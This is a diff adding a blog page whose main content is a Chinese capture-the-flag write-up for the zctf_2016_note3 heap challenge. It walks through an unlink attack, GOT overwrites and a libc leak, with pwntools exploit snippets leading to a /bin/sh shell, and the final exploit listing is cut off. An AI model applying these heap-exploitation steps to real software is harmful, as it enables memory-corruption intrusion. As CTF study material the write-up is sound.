@@ -1,0 +1,653 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>我的技术与生活——小站首页 | lonely is alwals</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/public.css" />
+  <link rel="stylesheet" href="/css/layout.css" />
+  <link rel="stylesheet" href="/css/iconfont.css" />
+  <link rel="stylesheet" href="/css/APlayer.min.css" />
+  <script src="/js/APlayer.min.js"></script>
+  <script src="/js/jquery.min.js"></script>
+  <script src="/js/jquery.pjax.min.js"></script>
+
+  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+  <script>
+    document.title = `我的技术与生活——小站首页`
+  </script>
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<style>
+  .load {
+    width: 100%;
+    height: 100vh;
+    background-color: rgb(37, 35, 40);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    position: relative;
+    z-index: 9999;
+  }
+  .load-circle {
+    width: 80px;
+    height: 80px;
+    border: 8px solid orange;
+    border-bottom-color: transparent;
+    border-radius: 50%;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    animation: rotate 1s linear infinite;
+    filter: drop-shadow(0 0 3px orange);
+  }
+  .load-circle-inner {
+    width: 40px;
+    height: 40px;
+    border: 8px solid orange;
+    border-top-color: transparent;
+    border-radius: 50%;
+    animation: rotate-reverse .5s linear infinite;
+  }
+  .load-text {
+    margin-top: 20px;
+    font-size: 24px;
+    color: orange;
+    display: flex;
+  }
+  .load-text span {
+    margin: 0 5px;
+    text-shadow: 5px 5px 5px orange;
+    animation: move 1s linear infinite;
+  }
+  .load-text span:nth-child(1) {
+    animation-delay: -0.6s;
+  }
+  .load-text span:nth-child(2) {
+    animation-delay: -0.5s;
+  }
+  .load-text span:nth-child(3) {
+    animation-delay: -0.4s;
+  }
+  .load-text span:nth-child(4) {
+    animation-delay: -0.3s;
+  }
+  .load-text span:nth-child(5) {
+    animation-delay: -0.2s;
+  }
+  .load-text span:nth-child(6) {
+    animation-delay: -0.1s;
+  }
+  @keyframes rotate {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(360deg); }
+  }
+  @keyframes rotate-reverse {
+    0% { transform: rotate(0); }
+    100% { transform: rotate(-360deg); }
+  }
+  @keyframes move {
+    0% { transform: translateY(0%) rotate(0) scale(1); }
+    20% { transform: translateY(20%) rotate(10deg) scale(1.2); }
+    80% { transform: translateY(-10%) rotate(-20deg) scale(.8);}
+    100% { transform: translateY(0) rotate(0) scale(1); }
+  }
+
+  .progress {
+    position: fixed;
+    left: 0; top: 0;
+    width: 0;
+    height: 3px;
+    background-color: green;
+    transition: all cubic-bezier(0.215, 0.610, 0.355, 1) .1s;
+    z-index: 9999;
+  }
+
+  .to-up {
+    animation: toUp .5s 1;
+  }
+  .gray {
+    position: fixed;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100vh;
+    z-index: 9999;
+    display: none;
+    pointer-events: none;
+    background-color: #000;
+    mix-blend-mode: color;
+  }
+  @keyframes toUp {
+    from { transform: translateY(15px); opacity: 0; }
+    to { transform: translateY(0) ; opacity: 1; }
+  }
+</style>
+<body>
+  <div id="load" class="load">
+    <div class="load-circle">
+      <div class="load-circle-inner"></div>
+    </div>
+    <p class="load-text">
+      <span>L</span>
+      <span>O</span>
+      <span>A</span>
+      <span>D</span>
+      <span>I</span>
+      <span>N</span>
+      <span>G</span>
+    </p>
+  </div>
+  <div id="container" class="container w-100 vh-100" style="display: none;">
+    <header class="header">
+  <div class="header-wrapper">
+    <div class="header-left">
+      <div class="header-search">
+        <input id="search-input" type="text" class="header-search--input" placeholder="请输入要检索的文章标题" />
+        <span id="search-btn" class="header-search--icon"><i class="iconfont icon-sousuo"></i></span>
+      </div>
+      <div id="search-layer" class="header-search--layer hidden">
+        <p class="title">
+          <span>以下是搜索内容：</span>
+          <span id="close-layer-btn">关闭</span>
+        </p>
+        <ul>
+        </ul>
+      </div>
+    </div>
+    <div class="header-right">
+      <ul class="header-menu">
+        <li>
+          <a href="https://github.com/degial/">
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+            <span class="header-menu--span">首页</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/log">
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+            <span class="header-menu--span">日志</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/link">
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+            <span class="header-menu--span">友情链接</span>
+          </a>
+        </li>
+        <li>
+          <a href="https://github.com/degial/about">
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+            <span class="header-menu--span">关于我</span>
+          </a>
+        </li>
+      </ul>
+    </div>
+  </div>
+</header>
+
+<script>
+  const ipt = document.querySelector('#search-input')
+  const btn = document.querySelector('#search-btn')
+  const layer = document.querySelector('#search-layer')
+  const posts = JSON.parse(`[{"title":"ACTF_2019_OneRepeater","path":"/posts/319d974/"},{"title":"ACTF_2019_message","path":"/posts/f5d1b033/"},{"title":"GUESS","path":"/posts/c587cd26/"},{"title":"NewStar","path":"/posts/d23e595a/"},{"title":"SWPUCTF_2019_p1KkHeap","path":"/posts/a25249b0/"},{"title":"SWPUCTF_2019_login","path":"/posts/61db3fed/"},{"title":"b00ks","path":"/posts/be955ceb/"},{"title":"b0verfl0w","path":"/posts/b656e51/"},{"title":"bad","path":"/posts/822b39fb/"},{"title":"babyheap_0ctf_2017","path":"/posts/1a2f921f/"},{"title":"bbctf_2020_write","path":"/posts/75171fcc/"},{"title":"ciscn_2019_c_3","path":"/posts/7d6af77/"},{"title":"ciscn_2019_c_5","path":"/posts/eeb50a42/"},{"title":"ciscn_2019_es_1","path":"/posts/90ce1974/"},{"title":"checkin","path":"/posts/e1631c91/"},{"title":"ciscn_2019_es_7","path":"/posts/79adbc41/"},{"title":"ciscn_final_2","path":"/posts/9a3dca0e/"},{"title":"ciscn_pwn","path":"/posts/344ab8fb/"},{"title":"ciscn_final_5","path":"/posts/4595fad/"},{"title":"easyshell","path":"/posts/9ea1a33f/"},{"title":"freenote_x64","path":"/posts/231495d9/"},{"title":"glibc","path":"/posts/58b6dd93/"},{"title":"gostack","path":"/posts/ad559ced/"},{"title":"heap","path":"/posts/bd2922e1/"},{"title":"hitcon2014_stkof","path":"/posts/78860fdf/"},{"title":"200~house_of_force","path":"/posts/a8db7475/"},{"title":"inndy_rop","path":"/posts/19fdcc0c/"},{"title":"","path":"/posts/0/"},{"title":"jiandan_pwn1","path":"/posts/595198b9/"},{"title":"heapcreator","path":"/posts/707c38cf/"},{"title":"lctf2016_pwn200","path":"/posts/6f5f7bb7/"},{"title":"level4","path":"/posts/7792b02a/"},{"title":"login","path":"/posts/aa08cb10/"},{"title":"mergeheap","path":"/posts/709727a2/"},{"title":"metasequoia_2020_samsara","path":"/posts/dff3306c/"},{"title":"note2","path":"/posts/c0d78a/"},{"title":"","path":"/posts/0/"},{"title":"python课设","path":"/posts/5eca8ee9/"},{"title":"overlapping_chunks","path":"/posts/37a70f1c/"},{"title":"qwnt2024","path":"/posts/a036fd99/"},{"title":"roarctf_2019_easypwn","path":"/posts/29aca647/"},{"title":"sctf2019_easy_heap","path":"/posts/b5a0cf5/"},{"title":"sctf_2019_easy_heap","path":"/posts/afe33925/"},{"title":"sleepyHolder_hitcon_2016","path":"/posts/b1e92899/"},{"title":"starctf_2019_girlfriend","path":"/posts/2672e039/"},{"title":"STKOF","path":"/posts/696f0fbd/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"stdout","path":"/posts/c2c94c1c/"},{"title":"","path":"/posts/0/"},{"title":"武功论剑","path":"/posts/6ca732a0/"},{"title":"解决libc6软件包和libc6-dev不匹配的问题","path":"/posts/24332419/"},{"title":"xpdf","path":"/posts/7e7e55f1/"},{"title":"CVE-2020-8423","path":"/posts/24932e9/"},{"title":"trick","path":"/posts/d8f0a91e/"},{"title":"沙箱","path":"/posts/fbdf783e/"},{"title":"","path":"/posts/0/"},{"title":"pstack","path":"/posts/3d6a2015/"}]`)
+  ipt.addEventListener('keyup', e => {
+    if (e.key === 'Enter') {
+      handleSearch()
+    }
+  })
+  btn.addEventListener('click', () => {
+    handleSearch()
+  })
+
+  document.querySelector('#close-layer-btn').addEventListener('click', () => {
+    layer.classList.toggle('hidden')
+  })
+
+  function handleSearch() {
+    if (ipt.value.trim() === '') {
+      return
+    }
+    let html = ''
+    const targetPosts = posts.filter(post => post.title.includes(ipt.value))
+    targetPosts.forEach(post => {
+      html += `
+        <li>
+          <div>
+            <a href="/${post.path}">${post.title.replace(new RegExp(ipt.value), `<span>${ipt.value}</span>`)}</a>
+          </div>
+          <img src="${post.cover || '/imgs/default-cover.webp' }" />
+        </li>
+      `
+    })
+    if (html.trim () === '') {
+      html += '<p class="empty">没有搜索到内容</p>'
+    }
+    layer.querySelector('ul').innerHTML = html
+    layer.classList.remove('hidden')
+  }
+</script> 
+    <section id="main" class="main">
+      <div class="main-left-wrapper">
+<div class="main-left">
+  <div class="main-left--block">
+    <div class="main-left--info">
+      <img src="/imgs/avatar.jpg"" class="main-left--avatar" />
+      <div class="main-left--intro">
+        <p class="main-left--name">Cola.</p>
+        <div class="main-left--tags">
+          <span class="main-left--tag">中二</span>
+          <span class="main-left--tag">宅</span>
+        </div>
+      </div>
+    </div>
+  
+    <div>
+      <div class="main-left--motto">
+        <p>“花有重开日，人无再少年”</p>
+        <p>“一个简单普通的男孩”</p>
+      </div>
+      <div class="main-left--github">
+        <span class="line"></span>
+        <a href="https://github.com/Aizener"><i class="logo iconfont icon-github-fill"></i></a>
+        <span class="line"></span>
+      </div>
+      <div class="main-left--statics">
+        <a href="/categories">
+          <div>
+            <span>0</span>
+            <span>分类</span>
+          </div>
+        </a>
+        <a href="/tags">
+          <div>
+            <span>2</span>
+            <span>标签</span>
+          </div>
+        </a>
+        <a href="/archives">
+          <div>
+            <span>12 </span>
+            <span>归档</span>
+          </div>
+        </a>
+      </div>
+    </div>
+  </div>
+
+  <div class="main-left--block">
+    <ul class="main-left--menu">
+      
+        <li>
+          <a href="/">
+            <span class="header-menu--span">小站首页</span>
+            <i class="header-menu--icon iconfont icon-shouye"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/log">
+            <span class="header-menu--span">个人日志</span>
+            <i class="header-menu--icon iconfont icon-rizhi"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/link">
+            <span class="header-menu--span">友情链接</span>
+            <i class="header-menu--icon iconfont icon-youqinglianjie"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/about">
+            <span class="header-menu--span">关于自己</span>
+            <i class="header-menu--icon iconfont icon-guanyuwomen"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a href="/tools">
+            <span class="header-menu--span">我的工具</span>
+            <i class="header-menu--icon iconfont icon-gongju"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+  <div class="main-left--block">
+    <div class="main-left--site">
+      <h5 class="main-left--title">
+        <span>站点信息</span>
+        <i class="iconfont icon-zhandian"></i>
+      </h5>
+      <p class="main-left--subtitle">
+        <span>文章数目：</span>
+        <span>57 篇</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>最近动态：</span>
+        <span>今天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>上线时间：</span>
+        <span>1033天</span>
+      </p>
+      <p class="main-left--subtitle">
+        <span>当前版本：</span>
+        <span>v1.0.2</span>
+      </p>
+    </div>
+  </div>
+</div></div>
+      <div id="main-container" class="main-container">
+
+
+  <link rel="stylesheet" href="/css/partial/article.css" />
+
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title"></h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
+            
+          </div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2023-10-14 21:49:24</p>
+        </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
+      </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><h4 id="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"><a href="#这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。" class="headerlink" title="这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。"></a>这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。</h4><h4 id="先看add函数"><a href="#先看add函数" class="headerlink" title="先看add函数"></a>先看add函数</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAZ7T.png" alt="image-20231014214742855"></p>
+<h4 id="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去"><a href="#第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub-4008dd的函数，再点进去" class="headerlink" title="第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去"></a>第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFTgo.png" alt="image-20231012210324374"></p>
+<h4 id="sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。"><a href="#sub-4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数-char-a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’-x00’时结束，这里的a3-10其实就是截止符’-xa’，后面两条已经不重要了。" class="headerlink" title="sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3=10其实就是截止符’\xa’，后面两条已经不重要了。"></a>sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\x00’时结束，这里的a3=10其实就是截止符’\xa’，后面两条已经不重要了。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFEWD.png" alt="image-20231012210438919"></p>
+<h4 id="最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"><a href="#最后返回的是我们输入的第十二行size的值。第十九行的sub-4008dd函数也是同理，不过输入的长度有size决定。外面的sub-400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size" class="headerlink" title="最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size"></a>最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFqNA.png" alt="image-20231012211843683"></p>
+<h4 id="edit函数，先看第16行的read函数，第一个参数-amp-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"><a href="#edit函数，先看第16行的read函数，第一个参数-amp-ptr-v3-其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。" class="headerlink" title="edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。"></a>edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFGp5.png" alt="image-20231012212200515"></p>
+<h4 id="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"><a href="#dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞" class="headerlink" title="dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞"></a>dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFN7s.png" alt="image-20231012212926978"></p>
+<h4 id="重点的地方在这，就是unlink的怎么构造。"><a href="#重点的地方在这，就是unlink的怎么构造。" class="headerlink" title="重点的地方在这，就是unlink的怎么构造。"></a>重点的地方在这，就是unlink的怎么构造。</h4><h4 id="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并"><a href="#先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd-ptr-0x18和bk-ptr-0x10，后期会进行和并" class="headerlink" title="先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd=ptr-0x18和bk=ptr-0x10，后期会进行和并"></a>先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd=ptr-0x18和bk=ptr-0x10，后期会进行和并</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ptr=<span class="number">0x6020c8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line">payload1=p64(<span class="number">0</span>)+p64(<span class="number">0xb1</span>)+p64(fd)+p64(bk)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,payload1) <span class="comment">#堆0</span></span><br><span class="line">add(<span class="number">0</span>,<span class="string">'bbbb'</span>)      <span class="comment">#堆1</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'CCCC'</span>)   <span class="comment">#堆2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'dddd'</span>)   <span class="comment">#堆3 </span></span><br><span class="line">dele(<span class="number">1</span>)</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"><a href="#关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10-后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2" class="headerlink" title="关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2"></a>关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2=p64(0)*2+p64(0xb0)+p64(0xa0)</span><br><span class="line"></span><br><span class="line">add(0,payload2)</span><br></pre></td></tr></tbody></table></figure>
+<h4 id="覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用"><a href="#覆盖后的堆块是长这样的，把第堆2的大小和它的previous-in-use位改成了0-也就是上一个堆堆1没有使用" class="headerlink" title="覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用"></a>覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFaDX.png" alt="image-20231014153740961.png"></p>
+<h4 id="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。"><a href="#当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous-size-0xbbb0c8这里表示上一个堆没有使用。" class="headerlink" title="当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。"></a>当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。</h4><p><img src="zctf_2016_note3.assets/AJTB31Sv6tYn9Vu.png" alt="image-20231014161643622.png"></p>
+<h4 id="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"><a href="#当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。" class="headerlink" title="当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。"></a>当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。</h4><p><img src="https://i.imgs.ovh/2023/10/14/rFyAU.png" alt="image-20231014162533011.png"></p>
+<h4 id="而在dele-2-后"><a href="#而在dele-2-后" class="headerlink" title="而在dele(2)后"></a>而在dele(2)后</h4><h4 id="存放堆2的指针被置零了"><a href="#存放堆2的指针被置零了" class="headerlink" title="存放堆2的指针被置零了"></a>存放堆2的指针被置零了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rACx0.png" alt="image-20231014163605611.png"></p>
+<h4 id="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"><a href="#这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了" class="headerlink" title="这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了"></a>这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了</h4><p><img src="https://i.imgs.ovh/2023/10/14/rAPjC.png" alt="image-20231014163850174.png"></p>
+<h4 id="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"><a href="#0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放" class="headerlink" title="0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放"></a>0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放</h4><h4 id="之后的bin是这样的"><a href="#之后的bin是这样的" class="headerlink" title="之后的bin是这样的"></a>之后的bin是这样的</h4><p><img src="zctf_2016_note3.assets/x8DgM9LaTris3oF.png" alt="image-20231014164403504.png"></p>
+<h4 id="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"><a href="#然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写" class="headerlink" title="然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写"></a>然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">'free'</span>]) * <span class="number">2</span> + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0</span>) + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgs.ovh/2023/10/14/rALVt.png" alt="image-20231014164701954.png"></p>
+<h4 id="再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt"><a href="#再把edit堆0-也就是edit0x602018（free-got-地址的内容改写成-0x400730-puts-plt" class="headerlink" title="再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt"></a>再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_plt</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0X400730</span>)[:-<span class="number">1</span>]) <span class="comment">#puts_plt</span></span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgs.ovh/2023/10/14/rAXkm.png" alt="image-20231014165150300"></p>
+<h4 id="这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移"><a href="#这样再dele堆1的时候也就是free-0x6020d0这个地址，也就是puts-elf-got-‘atoi’-从而获得atoi的got项的内容，从而可以算出libc的偏移" class="headerlink" title="这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移"></a>这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line">success(<span class="string">'atoi_addr = '</span> + <span class="built_in">hex</span>(atoi_addr))</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="https://i.imgs.ovh/2023/10/14/rArgN.png" alt="image-20231014165713253"></p>
+<h4 id="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。"><a href="#然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘-bin-sh’就可以提权了。" class="headerlink" title="然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘/bin/sh’就可以提权了。"></a>然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘/bin/sh’就可以提权了。</h4><h4 id="最后的exp"><a href="#最后的exp" class="headerlink" title="最后的exp"></a>最后的exp</h4><figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span 